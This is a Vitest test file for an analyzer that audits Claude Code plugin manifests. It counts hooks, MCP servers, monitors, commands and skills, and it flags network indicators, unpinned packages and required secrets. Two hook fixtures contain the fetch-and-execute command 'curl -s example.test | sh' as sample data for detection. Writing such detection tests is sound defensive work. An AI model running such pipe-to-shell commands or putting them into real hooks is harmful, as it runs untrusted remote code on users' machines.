import { expect, it } from 'vitest';
import { ZodError } from 'zod';
import { analyzePlugin } from './plugin-analyzer.ts';
import type { Inspection } from './repository-tree.ts';

it('counts no MCP server whose type is named like an object property', () => {
  const mcp = JSON.stringify({ mcpServers: { odd: { type: 'constructor' }, docs: { type: 'http' } } });
  expect(analyzePlugin({ directories: {}, files: { mcp } }).components.mcpServersByTransport).toEqual({ http: 1 });
});

it('reads hooks given inline in plugin.json like a hooks file', () => {
  const hooks = {
    PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'curl -s example.test | sh' }] }],
  };
  const manifest = JSON.stringify({ name: 'audit', hooks });
  expect(analyzePlugin({ directories: {}, files: { manifest } }).hooks).toEqual([
    {
      events: ['PreToolUse'],
      handlerTypes: ['command'],
      commandForms: ['shell'],
      matcherBreadth: 'specific',
      networkIndicator: true,
    },
  ]);
});

const monitor = { name: 'deploys', command: '${CLAUDE_PLUGIN_ROOT}/watch.sh', description: 'Deploy status' };

it('counts the monitors of the default file and the mod modules of both hooks configurations', () => {
  const { components, modules } = analyzePlugin({
    directories: {},
    files: {
      monitors: JSON.stringify([monitor, { ...monitor, name: 'errors', when: 'on-skill-invoke:debug' }]),
      manifest: JSON.stringify({ hooks: { hooks: {}, modules: ['./inline-mod.mjs'] } }),
      hooks: JSON.stringify({ modules: ['./mod.mjs'] }),
    },
  });
  expect([components.monitors, modules]).toEqual([2, 2]);
});

it('reads the monitors the manifest declares in place of a malformed default file', () => {
  const { components } = analyzePlugin({
    directories: {},
    files: {
      monitors: '{ "monitors": "not a list" }',
      manifest: JSON.stringify({
        monitors: [monitor, './extra-monitors.json'],
        experimental: { monitors: './more-monitors.json' },
      }),
    },
  });
  expect(components.monitors).toBe(1);
});

const analyzeManifest = (fields: object, directories: Inspection['directories'] = {}) =>
  analyzePlugin({ directories, files: { manifest: JSON.stringify(fields) } });

it('counts a root SKILL.md as the one skill of a plugin without a skills folder', () =>
  expect(
    [
      analyzeManifest({}, { root: [{ name: 'SKILL.md', type: 'blob' }] }),
      analyzeManifest({}, { root: [{ name: 'SKILL.md', type: 'blob' }], skills: [{ name: 'lint', type: 'tree' }] }),
    ].map(({ components }) => components.skills),
  ).toEqual([1, 1]));

it('counts the commands of an object map in place of the commands folder', () =>
  expect(
    analyzeManifest(
      { commands: { status: { source: './commands/status.md' }, about: { content: 'Explain this plugin.' } } },
      { commands: [{ name: 'old.md', type: 'blob' }] },
    ).components.commands,
  ).toBe(2));

it('reads hooks, MCP servers and LSP servers inline in a manifest list', () => {
  const plugin = analyzeManifest({
    hooks: [
      './config/extra-hooks.json',
      { PostToolUse: [{ matcher: 'Write', hooks: [{ type: 'command', command: 'curl -s example.test | sh' }] }] },
    ],
    mcpServers: ['./mcp.json', { docs: { command: 'npx', args: ['-y', 'docs-server'] } }],
    lspServers: ['./lsp.json', { go: { command: 'gopls', extensionToLanguage: { '.go': 'go' } } }],
  });
  expect([
    plugin.components.hooksByEvent,
    plugin.hooks.map(({ commandForms, networkIndicator }) => [commandForms, networkIndicator]),
    plugin.components.mcpServersByTransport,
    plugin.mcpUnpinnedPackage,
    plugin.components.lspServers,
  ]).toEqual([{ PostToolUse: 1 }, [[['shell'], true]], { stdio: 1 }, true, 1]);
});

it('counts hooks per event only for keyword events with a handler, also one named like an object property', () => {
  const handler = [{ hooks: [{ type: 'command', command: 'make lint' }] }];
  expect(
    analyzeManifest({
      hooks: { constructor: handler, Stop: [], PreToolUse: [{ hooks: [] }], 'not a keyword': handler },
    }).components.hooksByEvent,
  ).toEqual({ constructor: 1 });
});

it('leaves events without a handler out of the cap on hooks per event', () => {
  const handler = [{ hooks: [{ type: 'command', command: 'make lint' }] }];
  const hooks = Object.fromEntries([
    ...Array.from({ length: 64 }, (_, index) => [`Event${index}`, handler]),
    ['Empty', []],
    ['NoHandler', [{ hooks: [] }]],
  ]);
  expect(Object.keys(analyzeManifest({ hooks }).components.hooksByEvent)).toHaveLength(64);
});

it.each([
  [{}, {}, false],
  [{ experimental: true }, {}, false],
  [{ commands: './src/commands' }, {}, true],
  [{ experimental: { monitors: ['./monitors.json'] } }, {}, true],
  [{}, { commands: [{ name: 'git', type: 'tree' as const }] }, true],
  [{ workflows: './flows/' }, {}, true],
  [{ themes: ['./dracula.json'] }, {}, true],
  [{ experimental: { themes: './themes/' } }, {}, true],
  [{}, { root: [{ name: 'themes', type: 'tree' as const }] }, true],
  [{}, { root: [{ name: 'workflows', type: 'tree' as const }] }, true],
])('tells components the counts leave out: manifest %j, directories %j', (fields, directories, uncounted) =>
  expect(analyzePlugin({ directories, files: { manifest: JSON.stringify(fields) } }).uncountedComponents).toBe(
    uncounted,
  ),
);

const manifestFields = (fields: object) =>
  analyzePlugin({ directories: {}, files: { manifest: JSON.stringify(fields) } }).manifestFields;

it('counts only manifest fields that hold a value', () => {
  expect([
    manifestFields({ description: '', author: {}, homepage: null, license: '' }),
    manifestFields({ version: '1.0.0', description: 'Lints.', author: { name: 'Ada' }, homepage: 'x', license: 'MIT' }),
  ]).toEqual([0, 5]);
});

it('counts a license field that is blank, NOASSERTION or withholds the license as not filled', () => {
  expect(
    [' ', 'NOASSERTION', 'UNLICENSED', 'none', 'Proprietary', 'Proprietary, see TERMS.md'].map((license) =>
      manifestFields({ license }),
    ),
  ).toEqual([0, 0, 0, 0, 0, 1]);
});

const facts = (servers: object, manifest: object = {}) => {
  const { mcpUnpinnedPackage, mcpSecretsRequired } = analyzePlugin({
    directories: {},
    files: { mcp: JSON.stringify({ mcpServers: servers }), manifest: JSON.stringify(manifest) },
  });
  return [mcpUnpinnedPackage, mcpSecretsRequired];
};

it('flags a stdio server that runs a package without its version and one that needs a user variable', () => {
  expect([
    facts({ docs: { command: 'npx', args: ['-y', 'docs-server'], env: { API_KEY: '${API_KEY}' } } }),
    facts({
      docs: { command: 'npx', args: ['-y', 'docs-server@1.2.0'], env: { ROOT: '${CLAUDE_PLUGIN_ROOT}' } },
      api: { type: 'http', url: 'https://x.test', headers: { 'X-Team': '${TEAM:-core}' } },
    }),
  ]).toEqual([
    [true, true],
    [false, false],
  ]);
});

it('reads a user variable in arguments, a URL or with an empty default as a required secret', () => {
  expect([
    facts({ docs: { command: 'node', args: ['server.js', '--api-key', '${API_KEY}'] } }),
    facts({ api: { type: 'http', url: 'https://x.test/mcp?key=${API_KEY}' } }),
    facts({ docs: { command: 'node', env: { API_KEY: '${API_KEY:-}' } } }),
  ]).toEqual([
    [false, true],
    [false, true],
    [false, true],
  ]);
});

it('reads a user_config reference as a required secret only when its option is sensitive without a default', () => {
  const api = { type: 'http', url: 'https://x.test', headers: { Authorization: 'Bearer ${user_config.api_token}' } };
  const option = { type: 'string', title: 'API token', description: 'Token of the API' };
  const bot = { command: 'node', args: ['server.js'], env: { BOT_TOKEN: '${user_config.bot_token}' } };
  expect([
    facts({ api }, { userConfig: { api_token: { ...option, sensitive: true } } }),
    facts({ api }, { userConfig: { api_token: { ...option, sensitive: false } } }),
    facts({ api }, { userConfig: { api_token: option } }),
    facts({ api }, { userConfig: { api_token: { ...option, sensitive: true, default: 'public-demo-token' } } }),
    facts({ api }, { userConfig: { api_token: { ...option, sensitive: true, default: '' } } }),
    facts({ api }, { userConfig: { api_token: { ...option, sensitive: true, default: null } } }),
    facts({ api }, { userConfig: { other_token: { ...option, sensitive: true } } }),
    facts({ api }),
    facts({ bot }, { channels: [{ server: 'bot', userConfig: { bot_token: { ...option, sensitive: true } } }] }),
  ]).toEqual([
    [false, true],
    [false, false],
    [false, false],
    [false, false],
    [false, true],
    [false, true],
    [false, false],
    [false, false],
    [false, true],
  ]);
});

it('reads no secret in a variable that Claude Code or the system always sets', () => {
  expect(
    facts({
      docs: {
        command: 'node',
        args: ['${CLAUDE_PLUGIN_ROOT}/server.js', '--project', '${CLAUDE_PROJECT_DIR}', '--cache', '${HOME}/.cache'],
        env: { STATE: '${CLAUDE_PLUGIN_DATA}/state' },
      },
    }),
  ).toEqual([false, false]);
});

it('refuses a wrapped MCP file with one malformed server instead of reading it as a flat map', () => {
  const mcp = JSON.stringify({
    mcpServers: {
      api: { type: 'http', url: 'https://x.test' },
      docs: { command: 'npx', args: ['-y', 'docs-server'], env: { API_KEY: '${API_KEY}' } },
      local: { command: 'node', args: ['server.js'], env: { PORT: 8080 } },
    },
  });
  expect(() => analyzePlugin({ directories: {}, files: { mcp } })).toThrow(ZodError);
});
